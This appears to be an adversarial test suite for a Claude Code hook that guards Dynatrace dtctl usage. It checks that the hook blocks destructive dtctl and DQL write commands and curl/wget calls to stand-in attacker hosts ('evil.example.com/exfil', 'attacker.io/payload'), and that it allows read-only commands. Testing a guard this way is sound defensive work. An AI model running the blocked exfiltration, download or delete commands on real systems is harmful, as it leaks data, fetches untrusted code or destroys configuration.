#!/usr/bin/env python3
"""
Adversarial test suite for guard-dtctl.py.
Phase 3 gate: run after every change to the hook or settings.json.

Exit 0 = all pass. Exit 1 = failures present.
"""

import json
import subprocess
import sys
from pathlib import Path

HOOK = Path(__file__).parent.parent.parent / ".claude" / "hooks" / "guard-dtctl.py"


def run_hook(cmd: str):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}})
    r = subprocess.run(
        [sys.executable, str(HOOK)],
        input=payload, capture_output=True, text=True, timeout=10
    )
    return r.returncode, r.stdout.strip()


# (description, command, expect_blocked)
TESTS = [
    # --- MUST BE BLOCKED ---
    ("dtctl delete resource",      "dtctl delete workflow my-wf",                True),
    ("dtctl apply config",         "dtctl apply -f config.yaml",                 True),
    ("dtctl edit resource",        "dtctl edit workflow my-wf",                  True),
    ("dtctl restore snapshot",     "dtctl restore backup.json",                  True),
    ("dtctl exec workflow",        "dtctl exec workflow my-automation",          True),
    ("dtctl auth logout",          "dtctl auth logout",                          True),
    ("unknown verb (publish)",     "dtctl publish my-dashboard",                 True),
    ("DQL INGEST verb",            'dtctl query "INGEST logs | limit 1"',        True),
    ("DQL DELETE verb",            'dtctl query "fetch logs | DELETE"',          True),
    ("DQL INSERT verb",            'dtctl query "INSERT INTO logs SELECT 1"',    True),
    ("curl to non-DT host",        "curl https://evil.example.com/exfil",        True),
    ("wget to non-DT host",        "wget https://attacker.io/payload",           True),
    # --- MUST BE ALLOWED ---
    ("dtctl query (read DQL)",     'dtctl query "fetch dt.davis.problems | limit 1"', False),
    ("dtctl doctor",               "dtctl doctor",                               False),
    ("dtctl get workflows",        "dtctl get workflows",                        False),
    ("dtctl describe analyzer",    "dtctl describe analyzer my-a",              False),
    ("dtctl inventory",            "dtctl inventory --agent",                    False),
    ("dtctl exec copilot",         "dtctl exec copilot",                         False),
    ("dtctl config view",          "dtctl config view",                          False),
    ("dtctl version",              "dtctl version",                              False),
    ("dtctl commands",             "dtctl commands --brief -o json",             False),
    ("plain bash (ls)",            "ls -la scenarios/",                          False),
    ("python preflight",           "python tools/preflight.py check",            False),
    ("curl to DT playground",      "curl https://playground.apps.dynatrace.com/api/v2/problems", False),
]


def main():
    print(f"Guard hook: {HOOK}")
    print(f"Running {len(TESTS)} tests\n")

    passed = 0
    failed = []

    for desc, cmd, expect_blocked in TESTS:
        code, out = run_hook(cmd)
        blocked = (code == 2)
        ok = blocked == expect_blocked

        if ok:
            passed += 1
            status = "PASS"
        else:
            failed.append((desc, cmd, expect_blocked, code, out))
            status = "FAIL"

        label = "[BLOCK]" if blocked else "[ALLOW]"
        print(f"{status} {label} {desc}")
        if not ok:
            print(f"       expected blocked={expect_blocked}, got code={code}")
            if out:
                print(f"       hook output: {out[:100]}")

    print(f"\nResult: {passed}/{len(TESTS)} passed")
    if failed:
        print("\nFailed tests:")
        for desc, cmd, exp, code, out in failed:
            print(f"  • {desc}")
            print(f"    cmd: {cmd}")
        sys.exit(1)
    else:
        print("Phase 3 gate: ALL adversarial tests PASSED")
        sys.exit(0)


if __name__ == "__main__":
    main()
